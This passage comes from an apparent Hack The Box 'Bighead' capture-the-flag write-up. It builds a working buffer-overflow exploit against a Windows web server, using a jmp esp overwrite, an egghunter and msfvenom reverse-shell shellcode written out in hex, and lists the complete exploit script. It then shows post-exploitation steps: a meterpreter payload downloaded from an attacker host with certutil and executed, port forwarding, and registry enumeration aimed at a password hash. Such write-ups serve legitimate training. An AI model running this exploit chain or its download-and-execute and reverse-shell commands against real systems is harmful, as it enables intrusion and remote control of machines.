0x6250134d : jmp esp | ascii {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\bighead\BHWS_Backup\bHeadSvr.dll)
0x6455b1ca : push esp # ret  |  {PAGE_EXECUTE_READ} [libmingwex-0.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\bighead\BHWS_Backup\libmingwex-0.dll)
</code></pre></div></div>
<h4 id="lets-send-a-request-to-test-it-72-as-then-f0125062-which-is-625012f0-reversed">Let’s send a request to test it, 72 A’s then <code class="highlighter-rouge">f0125062</code> which is <code class="highlighter-rouge">625012f0</code> reversed:</h4>
<p><img src="/images/hackthebox/bighead/70.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/bighead/71.png" alt="" /></p>
<h4 id="its-working-fine-last-thing-we-need-to-know-is-how-to-send-the-shellcode-i-sent-a-post-request-to-see-how-the-server-handles-it-just-a-bunch-of-as-">It’s working fine. Last thing we need to know is how to send the shellcode. I sent a POST request to see how the server handles it, just a bunch of A’s :</h4>
<p><img src="/images/hackthebox/bighead/72.png" alt="" /></p>
<h4 id="then-i-searched-in-the-memory-">Then I searched in the memory :</h4>
<p><img src="/images/hackthebox/bighead/73.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/bighead/74.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/bighead/75.png" alt="" /></p>
<h4 id="as-we-can-see-the-whole-request-is-printed-in-the-memory-with-this-information-now-we-can-write-the-exploit">As we can see the whole request is printed in the memory. With this information now we can write the exploit.</h4>
<p><br /></p>
<hr />

<h3 id="writing-the-exploit">Writing the Exploit</h3>
<h4 id="first-thing-is-the-imports-i-imported-socketbinascii-and-re">First thing is the imports, I imported <code class="highlighter-rouge">socket</code>,<code class="highlighter-rouge">binascii</code> and <code class="highlighter-rouge">re</code></h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import socket
import binascii
import re
</code></pre></div></div>
<h4 id="then-i-started-to-define-the-variables--we-need-variables-to-hold-the-host-the-port-the-egg-the-shellcode-and-the-egghunter-lets-generate-the-shellcode-first-">Then I started to define the variables , we need variables to hold the host, the port, the egg, the shellcode and the egghunter. Let’s generate the shellcode first :</h4>
<p><code class="highlighter-rouge">msfvenom -p windows/shell_reverse_tcp LHOST=10.10.xx.xx LPORT=1337 -b '\x00' -f python</code>
<img src="/images/hackthebox/bighead/76.png" alt="" /></p>
<h4 id="-b-x00-is-for-bad-chars-x00-which-is-a-null-byte-is-always-a-bad-char-because-it-acts-a-string-terminator-and-terminates-the-execution-so-we-dont-need-that-in-the-shellcode--we-will-add-this-to-the-exploit-and-remove-x-because-we-will-use-hexlify-and-unhexlify-functions-from-binascii-this-is-for-the-shellcode-now-we-need-the-egghunter-i-used-this-tool-to-generate-the-egghunter-"><code class="highlighter-rouge">-b '\x00'</code> is for bad chars. <code class="highlighter-rouge">\x00</code> which is a null byte is always a bad char because it acts a string terminator and terminates the execution so we don’t need that in the shellcode.  We will add this to the exploit and remove <code class="highlighter-rouge">\x</code> because we will use <code class="highlighter-rouge">hexlify</code> and <code class="highlighter-rouge">unhexlify</code> functions from <code class="highlighter-rouge">binascii</code>. This is for the shellcode, now we need the egghunter. I used this <a href="https://github.com/ihack4falafel/OSCE/blob/master/Tools/EggHunter.py">tool</a> to generate the egghunter :</h4>
<p><img src="/images/hackthebox/bighead/77.png" alt="" /></p>
<h4 id="but-i-didnt-like-that-i-should-generate-a-new-one-if-i-wanted-to-change-the-egg-heres-how-the-tool-is-doing-it-">But I didn’t like that I should generate a new one if I wanted to change the egg, here’s how the tool is doing it :</h4>
<p><img src="/images/hackthebox/bighead/78.png" alt="" /></p>
<h4 id="we-can-easily-add-this-to-the-exploit-itself">We can easily add this to the exploit itself.</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>host = '10.10.10.112'
port = 80
egg = 'R1ck'
</code></pre></div></div>
<h4 id="host-is-for-the-ip-of-the-machine-port-is-for-the-port-and-egg-is-to-hold-the-value-of-the-egg-after-that-comes-the-buf-variable-generated-by-msfvenom-this-is-the-my-shellcode-you-should-generate-a-new-one-with-your-ip-and-listening-port-"><code class="highlighter-rouge">host</code> is for the ip of the machine, <code class="highlighter-rouge">port</code> is for the port and <code class="highlighter-rouge">egg</code> is to hold the value of the egg. After that comes the <code class="highlighter-rouge">buf</code> variable generated by <code class="highlighter-rouge">msfvenom</code> (this is the my shellcode you should generate a new one with your ip and listening port) :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>buf =  ""
buf += "d9c7d97424f45a2bc9bb9f0948"
buf += "3bb15283c204315a1303c51aaa"
buf += "ce05f4a831f505cdb81034cddf"
buf += "5167fd94378476f8a31ffad5c4"
buf += "a8b103eb29e9706aaaf0a44c93"
buf += "3ab98dd42730df8d2ce7cfba79"
buf += "3464f06c3c99418e6d0cd9c9ad"
buf += "af0e62e4b7534fbe4ca73b4184"
buf += "f9c4eee93537ee2ef1a8854601"
buf += "549e9d7b822b05db418be1dd86"
buf += "4a62d163182cf672cd4702fef0"
buf += "878244d703ce1f7612aace8744"
buf += "15ae2d0fb8bb5f52d508526c25"
buf += "07e51f17885db71b4178405b78"
buf += "3cdea2833df760d76d6f4058e6"
buf += "6f6d8da93fc17e0aefa12ee2e5"
buf += "2d101206e439b9fd6f4c34ee74"
buf += "384a108e81c3f6fae185a19298"
buf += "8f3902641a4404eea9b9cb07c7"
buf += "a9bce792936bf708bbf06ad73b"
buf += "7e97406cd76999f8c5d0331e14"
buf += "847c9ac375822381c2a0335fca"
buf += "ec670f9dbad1e9770d8ba324c7"
buf += "5b3507d81d3a42aec18b3bf7fe"
buf += "24acff87584cff52d97c4afe48"
buf += "15136bc978a4460e852762ef72"
buf += "3707ea3ffff486506afa3550bf"

</code></pre></div></div>
<h4 id="i-created-a-variable-to-hold-the-final-shellcode-egg-doubled--shellcode-and-another-variable-for-the-egghunter-">I created a variable to hold the final shellcode (egg doubled + shellcode) and another variable for the egghunter :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shellcode = (egg * 2) + binascii.unhexlify(buf)
egghunter = "6681caff0f42526a0258cd2e3c055a74efb8" + binascii.hexlify(egg) + "8bfaaf75eaaf75e7ffe7"
</code></pre></div></div>
<p><img src="/images/hackthebox/bighead/79.png" alt="" /></p>
<h4 id="note--theres-a-variable-called-n-that-will-come-later-and-it-has-nothing-to-do-with-the-exploit-itself">Note : there’s a variable called <code class="highlighter-rouge">N</code>, that will come later and it has nothing to do with the exploit itself.</h4>
<h4 id="now-we-need-to-create-two-functions-first-one-is-to-send-the-shellcode-through-a-post-request-the-other-one-is-to-exploit-the-vulnerability-and-send-the-egghunter">Now we need to create two functions. First one is to send the shellcode through a POST request, The other one is to exploit the vulnerability and send the egghunter.</h4>
<h4 id="we-will-start-by-defining-the-function-">We will start by defining the function :</h4>
<p><code class="highlighter-rouge">def send_shellcode(N,host,port,egg,shellcode):</code></p>
<h4 id="then-we-will-open-a-tcp-stream-socket-to-the-server-and-the-port-and-hold-it-in-a-variable-called-s-">Then we will open a TCP stream socket to the server and the port and hold it in a variable called <code class="highlighter-rouge">s</code> :</h4>
<p><code class="highlighter-rouge">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)</code></p>
<h4 id="last-thing-to-do-is-to-send-the-post-request-with-the-shellcode-">Last thing to do is to send the POST request with the shellcode :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>s.send("POST / HTTP/1.1\r\n")
s.send("Host: dev.bighead.htb\r\n")
s.send("Content-Length: %s\r\n"%len(shellcode))
s.send("\r\n")
s.send(shellcode+"\r\n")
s.send("\r\n")
</code></pre></div></div>
<h4 id="then-we-will-close-the-stream-">Then we will close the stream :</h4>
<p><code class="highlighter-rouge">s.close()</code></p>
<h4 id="i-added-this-in-a-for-loop-to-send-the-shellcode-16-times-i-did-this-because-i-wanted-to-put-the-shellcode-in-different-places-so-the-egghunter-finds-it-easily-i-also-added-a-print-statement-at-the-start-of-the-function--print-03332m--sending-shellcode-03332m-is-for-the-color-its-not-important-for-the-exploit-and-i-added-a-print-statement-before-closing-the-stream--print-03334m----strn-----resubrs-srecv12-resubrs-srecv12-this-will-use-re-regular-expressions-operations-to-print-the-first-12-chars-of-the-first-line-of-the-server-response-http11-----status-code-3-chars--12">I added this in a <code class="highlighter-rouge">for</code> loop to send the shellcode 16 times. I did this because I wanted to put the shellcode in different places so the egghunter finds it easily. I also added a print statement at the start of the function : <code class="highlighter-rouge">print "\033[32m [*] Sending Shellcode"</code>, <code class="highlighter-rouge">\033[32m</code> is for the color it’s not important for the exploit. And I added a print statement before closing the stream : <code class="highlighter-rouge">print '\033[34m' + '[' + str(N) + '] ' + re.sub(r"\s"," ",s.recv(12))</code>. <code class="highlighter-rouge">re.sub(r"\s"," ",s.recv(12))</code> This will use <code class="highlighter-rouge">re</code> (regular expressions operations) to print the first 12 chars of the first line of the server response (“HTTP/1.1” + “ “ + status code (3 chars) = 12).</h4>
<p><code class="highlighter-rouge">send_shellcode</code> :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def send_shellcode(N,host,port,egg,shellcode):
	print "\033[32m [*] Sending Shellcode"
	for i in range(0,16):
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)
		s.connect((host,port))
		s.send("POST / HTTP/1.1\r\n")
		s.send("Host: dev.bighead.htb\r\n")
		s.send("Content-Length: %s\r\n"%len(shellcode))
		s.send("\r\n")
		s.send(shellcode+"\r\n")
		s.send("\r\n")
		print '\033[34m' + '[' + str(N) + '] ' + re.sub(r"\s"," ",s.recv(12))
		s.close()
		N += 1
	print "\033[32m [*] Done"
</code></pre></div></div>
<p><img src="/images/hackthebox/bighead/80.png" alt="" /></p>
<h4 id="thats-for-send_shellcode-lets-write-send_egghunter-we-will-define-the-function-first-">That’s for <code class="highlighter-rouge">send_shellcode</code>, let’s write <code class="highlighter-rouge">send_egghunter</code>. We will define the function first :</h4>
<p><code class="highlighter-rouge">def send_egghunter(host,port,egghunter):</code></p>
<h4 id="then-we-will-open-a-tcp-stream-socket-to-the-server-and-the-port-and-hold-it-in-a-variable-called-s--1">Then we will open a TCP stream socket to the server and the port and hold it in a variable called <code class="highlighter-rouge">s</code> :</h4>
<p><code class="highlighter-rouge">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)</code></p>
<h4 id="then-we-will-connect-and-send-the-head-request-">Then we will connect and send the HEAD request :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>s.connect((host,port))
s.settimeout(None)
s.send("HEAD /" + ("A"*72) + "f0125062" + egghunter + " HTTP/1.1\r\n")
s.send("Host: dev.bighead.htb\r\n")
s.send("\r\n")
</code></pre></div></div>
<h4 id="i-did-settimeoutnone-as-the-server-takes-a-lot-of-time-to-respond-to-this-request-because-we-will-change-the-code-flow-so-the-server-wont-reply-and-we-dont-want-the-stream-to-be-closed-before-our-egghunter-is-successfully-executed">I did <code class="highlighter-rouge">settimeout(None)</code> as the server takes a lot of time to respond to this request (Because we will change the code flow so the server won’t reply) and we don’t want the stream to be closed before our egghunter is successfully executed.</h4>
<h4 id="ssendhead---a72--f0125062--egghunter---http11rn-this-line-sends-72-as-then-f0125062-jmp-esp-new-eip-then-the-egghunter"><code class="highlighter-rouge">s.send("HEAD /" + ("A"*72) + "f0125062" + egghunter + " HTTP/1.1\r\n")</code> This line sends 72 A’s then <code class="highlighter-rouge">f0125062</code> (jmp esp (new EIP)) then the egghunter.</h4>
<p><code class="highlighter-rouge">send_egghunter</code> :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def send_egghunter(host,port,egghunter):
	print "\033[32m [*] Sending EggHunter"
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)
	s.connect((host,port))
	s.settimeout(None)
	s.send("HEAD /" + ("A"*72) + "f0125062" + egghunter + " HTTP/1.1\r\n")
	s.send("Host: dev.bighead.htb\r\n")
	s.send("\r\n")
	print '\033[34m' + re.sub(r"\s"," ",s.recv(12))
	s.close()
	print "\033[32m [*] Done"
</code></pre></div></div>
<p><img src="/images/hackthebox/bighead/81.png" alt="" /></p>
<h4 id="the-exploit-is-ready-we-just-need-to-call-the-functions-">The exploit is ready, we just need to call the functions :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>send_shellcode(N,host,port,egg,shellcode)
send_egghunter(host,port,egghunter)
</code></pre></div></div>
<p><img src="/images/hackthebox/bighead/82.png" alt="" /></p>
<h4 id="final-exploit-">Final Exploit :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python</span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">binascii</span>
<span class="kn">import</span> <span class="nn">re</span>

<span class="n">host</span> <span class="o">=</span> <span class="s">'10.10.10.112'</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">80</span>
<span class="n">egg</span> <span class="o">=</span> <span class="s">'R1ck'</span>

<span class="n">N</span> <span class="o">=</span> <span class="mi">0</span>

<span class="n">buf</span> <span class="o">=</span>  <span class="s">""</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"d9c7d97424f45a2bc9bb9f0948"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"3bb15283c204315a1303c51aaa"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"ce05f4a831f505cdb81034cddf"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"5167fd94378476f8a31ffad5c4"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"a8b103eb29e9706aaaf0a44c93"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"3ab98dd42730df8d2ce7cfba79"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"3464f06c3c99418e6d0cd9c9ad"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"af0e62e4b7534fbe4ca73b4184"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"f9c4eee93537ee2ef1a8854601"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"549e9d7b822b05db418be1dd86"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"4a62d163182cf672cd4702fef0"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"878244d703ce1f7612aace8744"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"15ae2d0fb8bb5f52d508526c25"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"07e51f17885db71b4178405b78"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"3cdea2833df760d76d6f4058e6"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"6f6d8da93fc17e0aefa12ee2e5"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"2d101206e439b9fd6f4c34ee74"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"384a108e81c3f6fae185a19298"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"8f3902641a4404eea9b9cb07c7"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"a9bce792936bf708bbf06ad73b"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"7e97406cd76999f8c5d0331e14"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"847c9ac375822381c2a0335fca"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"ec670f9dbad1e9770d8ba324c7"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"5b3507d81d3a42aec18b3bf7fe"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"24acff87584cff52d97c4afe48"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"15136bc978a4460e852762ef72"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"3707ea3ffff486506afa3550bf"</span>

<span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span><span class="n">egg</span> <span class="o">*</span> <span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="n">binascii</span><span class="o">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
<span class="n">egghunter</span> <span class="o">=</span> <span class="s">"6681caff0f42526a0258cd2e3c055a74efb8"</span> <span class="o">+</span> <span class="n">binascii</span><span class="o">.</span><span class="n">hexlify</span><span class="p">(</span><span class="n">egg</span><span class="p">)</span> <span class="o">+</span> <span class="s">"8bfaaf75eaaf75e7ffe7"</span>

<span class="k">def</span> <span class="nf">send_shellcode</span><span class="p">(</span><span class="n">N</span><span class="p">,</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="n">egg</span><span class="p">,</span><span class="n">shellcode</span><span class="p">):</span>
	<span class="k">print</span> <span class="s">"</span><span class="se">\033</span><span class="s">[32m [*] Sending Shellcode"</span>
	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">16</span><span class="p">):</span>
		<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
		<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
		<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"POST / HTTP/1.1</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
		<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"Host: dev.bighead.htb</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
		<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"Content-Length: </span><span class="si">%</span><span class="s">s</span><span class="se">\r\n</span><span class="s">"</span><span class="o">%</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
		<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
		<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">shellcode</span><span class="o">+</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
		<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
		<span class="k">print</span> <span class="s">'</span><span class="se">\033</span><span class="s">[34m'</span> <span class="o">+</span> <span class="s">'['</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">N</span><span class="p">)</span> <span class="o">+</span> <span class="s">'] '</span> <span class="o">+</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="s">r"\s"</span><span class="p">,</span><span class="s">" "</span><span class="p">,</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">12</span><span class="p">))</span>
		<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
		<span class="n">N</span> <span class="o">+=</span> <span class="mi">1</span>
	<span class="k">print</span> <span class="s">"</span><span class="se">\033</span><span class="s">[32m [*] Done"</span>

<span class="k">def</span> <span class="nf">send_egghunter</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="n">egghunter</span><span class="p">):</span>
	<span class="k">print</span> <span class="s">"</span><span class="se">\033</span><span class="s">[32m [*] Sending EggHunter"</span>
	<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
	<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
	<span class="n">s</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="bp">None</span><span class="p">)</span>
	<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"HEAD /"</span> <span class="o">+</span> <span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">72</span><span class="p">)</span> <span class="o">+</span> <span class="s">"f0125062"</span> <span class="o">+</span> <span class="n">egghunter</span> <span class="o">+</span> <span class="s">" HTTP/1.1</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
	<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"Host: dev.bighead.htb</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
	<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
	<span class="k">print</span> <span class="s">'</span><span class="se">\033</span><span class="s">[34m'</span> <span class="o">+</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="s">r"\s"</span><span class="p">,</span><span class="s">" "</span><span class="p">,</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">12</span><span class="p">))</span>
	<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
	<span class="k">print</span> <span class="s">"</span><span class="se">\033</span><span class="s">[32m [*] Done"</span>

<span class="n">send_shellcode</span><span class="p">(</span><span class="n">N</span><span class="p">,</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="n">egg</span><span class="p">,</span><span class="n">shellcode</span><span class="p">)</span>
<span class="n">send_egghunter</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="n">egghunter</span><span class="p">)</span>
</code></pre></div></div>
<h4 id="now-its-show-time-lets-test-the-exploit-">Now it’s show time, Let’s test the exploit :</h4>
<p><img src="/images/hackthebox/bighead/83.png" alt="" /></p>
<h4 id="perfectly-working--we-got-a-reverse-shell">Perfectly working ! we got a reverse shell.</h4>
<p><br /></p>
<hr />

<h3 id="enumeration-enumeration-enumeration-">Enumeration, Enumeration, Enumeration …</h3>
<p><img src="/images/hackthebox/bighead/84.png" alt="" /></p>
<h4 id="we-are-on-the-machine-as-nelson-there-is-another-user-on-the-box-called-nginx-">We are on the machine as <code class="highlighter-rouge">nelson</code>, There is another user on the box called <code class="highlighter-rouge">nginx</code> :</h4>
<p><img src="/images/hackthebox/bighead/85.png" alt="" /></p>
<h4 id="i-checked-cusersnelson-and-cusersnelsondesktop-and-i-found-the-user-flag-">I checked <code class="highlighter-rouge">C:\Users\Nelson</code> and <code class="highlighter-rouge">C:\Users\Nelson\Desktop</code> and I found the user flag :</h4>
<p><img src="/images/hackthebox/bighead/86.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/bighead/87.png" alt="" /></p>
<h4 id="2962-bytes-well--no-its-not-the-user-flag-">2962 bytes? Well … no it’s not the user flag :</h4>
<p><img src="/images/hackthebox/bighead/88.png" alt="" /></p>
<h4 id="so-we-probably-we-need-to-be-nginx-to-get-the-user-flag-and-of-course-we-cant-access-nginx-directory-">So we probably we need to be <code class="highlighter-rouge">nginx</code> to get the user flag. And of course we can’t access <code class="highlighter-rouge">nginx</code> directory :</h4>
<p><img src="/images/hackthebox/bighead/89.png" alt="" /></p>
<h4 id="i-wanted-to-upgrade-that-reverse-shell-into-meterpreter-so-i-had-to-create-the-payload-first-">I wanted to upgrade that reverse shell into <code class="highlighter-rouge">meterpreter</code> so I had to create the payload first :</h4>
<p><code class="highlighter-rouge">msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.10.xx.xx LPORT=1338 -f exe &gt; m.exe</code>
<img src="/images/hackthebox/bighead/90.png" alt="" /></p>
<h4 id="then-i-set-up-the-meterpreter-handler-">Then I set up the <code class="highlighter-rouge">meterpreter</code> handler :</h4>
<p><img src="/images/hackthebox/bighead/91.png" alt="" /></p>
<h4 id="i-ran-a-python-simple-http-server-on-port-80--python--m-simplehttpserver-80-to-host-the-payload-then-i-went-to-cusersnelsonappdatalocaltemp-and-downloaded-the-payload-with-certutil-">I ran a python simple http server on port 80 : <code class="highlighter-rouge">python -m SimpleHTTPServer 80</code> to host the payload. Then I went to <code class="highlighter-rouge">C:\Users\Nelson\AppData\Local\Temp</code> and downloaded the payload with <code class="highlighter-rouge">certutil</code> :</h4>
<p><code class="highlighter-rouge">certutil -urlcache -split -f http://10.10.xx.xx/m.exe m.exe</code>
<img src="/images/hackthebox/bighead/92.png" alt="" /></p>
<h4 id="then-i-executed-it-and-got-a-meterpreter-session-">Then I executed it and got a <code class="highlighter-rouge">meterpreter</code> session :</h4>
<p><img src="/images/hackthebox/bighead/93.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/bighead/94.png" alt="" /></p>
<h4 id="from-meterpreter-i-wanted-to-look-at-the-services-so-i-did-ps-i-looked-through-them-and-found-an-interesting-service-called-bvsshserverexe">From <code class="highlighter-rouge">meterpreter</code> I wanted to look at the services so I did <code class="highlighter-rouge">ps</code>, I looked through them and found an interesting service called <code class="highlighter-rouge">BvSshServer.exe</code></h4>
<p><img src="/images/hackthebox/bighead/95.png" alt="" /></p>
<h4 id="i-wanted-to-know-the-listening-port-of-that-ssh-server-so-i-did-netstat-it-was-listening-on-port-2020-">I wanted to know the listening port of that ssh server, so I did <code class="highlighter-rouge">netstat</code>. It was listening on port 2020 :</h4>
<p><img src="/images/hackthebox/bighead/96.png" alt="" /></p>
<h4 id="so-i-forwarded-that-port-we-also-saw-earlier-when-we-went-to-codebigheadhtb-it-redirected-us-to-http1270015080testlinkloginphp-i-wanted-to-forward-that-port-too-to-check-whats-in-there-to-forward-a-port-through-meterpreter-we-can-simply-do-it-with-portfwd-">So I forwarded that port, We also saw earlier when we went to <code class="highlighter-rouge">code.bighead.htb</code> it redirected us to <code class="highlighter-rouge">http://127.0.0.1:5080/testlink/login.php</code>. I wanted to forward that port too to check what’s in there. To forward a port through <code class="highlighter-rouge">meterpreter</code> we can simply do it with <code class="highlighter-rouge">portfwd</code> :</h4>
<p><code class="highlighter-rouge">portfwd add -l 2020 -p 2020 -r bighead.htb</code>
<br />
<code class="highlighter-rouge">portfwd add -l 5080 -p 5080 -r bighead.htb</code>
<br />
<img src="/images/hackthebox/bighead/97.png" alt="" /></p>
<h4 id="lets-check-if-that-bvsshserver-is-a-real-ssh-server-">Let’s check if that <code class="highlighter-rouge">BvSshServer</code> is a real ssh server :</h4>
<p><img src="/images/hackthebox/bighead/98.png" alt="" /></p>
<h4 id="its-working-fine-now-we-need-a-password-to-login-we-already-know-the-username--nginx">It’s working fine, now we need a password to login. We already know the username : <code class="highlighter-rouge">nginx</code>.</h4>
<h4 id="i-went-to-codebigheadhtb-again-and-after-i-got-redirected-to-port-5080-on-localhost-i-got-some-sql-errors-">I went to <code class="highlighter-rouge">code.bighead.htb</code> again and after I got redirected to port 5080 on <code class="highlighter-rouge">localhost</code> I got some <code class="highlighter-rouge">SQL</code> errors :</h4>
<p><img src="/images/hackthebox/bighead/99.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/bighead/100.png" alt="" /></p>
<h4 id="as-you-can-see-it-disclosed-the-root-path--of-the-application--cxampp-i-tried-to-go-there-but-i-got-access-denied-">As you can see it disclosed the root path  of the application : <code class="highlighter-rouge">C:\xampp</code>. I tried to go there but I got access denied :</h4>
<p><img src="/images/hackthebox/bighead/101.png" alt="" /></p>
<h4 id="after-a-lot-of-enumeration-i-checked-the-registry-and-in-hklmsystemcurrentcontrolsetservices-i-found-the-registry-for-nignx-the-web-server-">After a lot of enumeration I checked the <code class="highlighter-rouge">registry</code> and in <code class="highlighter-rouge">HKLM\System\CurrentControlSet\Services\</code> I found the <code class="highlighter-rouge">registry</code> for <code class="highlighter-rouge">nignx</code> (The web server) :</h4>
<p><code class="highlighter-rouge">reg enumkey -k 'HKLM\System\CurrentControlSet\Services\'</code>
<img src="/images/hackthebox/bighead/102.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/bighead/103.png" alt="" /></p>
<h4 id="then-i-looked-at-the-values-and-i-found-two-interesting-ones-">Then I looked at the values and I found two interesting ones :</h4>
<p><code class="highlighter-rouge">reg enumkey -k 'HKLM\System\CurrentControlSet\Services\nginx</code>
<img src="/images/hackthebox/bighead/104.png" alt="" /></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; reg enumkey -k 'HKLM\System\CurrentControlSet\Services\nginx'
Enumerating: HKLM\System\CurrentControlSet\Services\nginx

  Keys (2):

        Parameters
        Enum

  Values (12):

        Type
        Start
        ErrorControl
        ImagePath
        DisplayName
        ObjectName
        Description
        DelayedAutostart
        FailureActionsOnNonCrashFailures
        FailureActions
        Authenticate
        PasswordHash
</code></pre></div></div>
<h4 id="authenticate-and-passwordhash-lets-look-at-the-value-"><code class="highlighter-rouge">Authenticate</code> and <code class="highlighter-rouge">PasswordHash</code>. Let’s look at the value :</h4>
<h4 id="authenticate-"><code class="highlighter-rouge">Authenticate</code> :</h4>
<p><code class="highlighter-rouge">reg queryval -k 'HKLM\System\CurrentControlSet\Services\nginx' -v Authenticate</code>
<img src="/images/hackthebox/bighead/105.png" alt="" /></p>
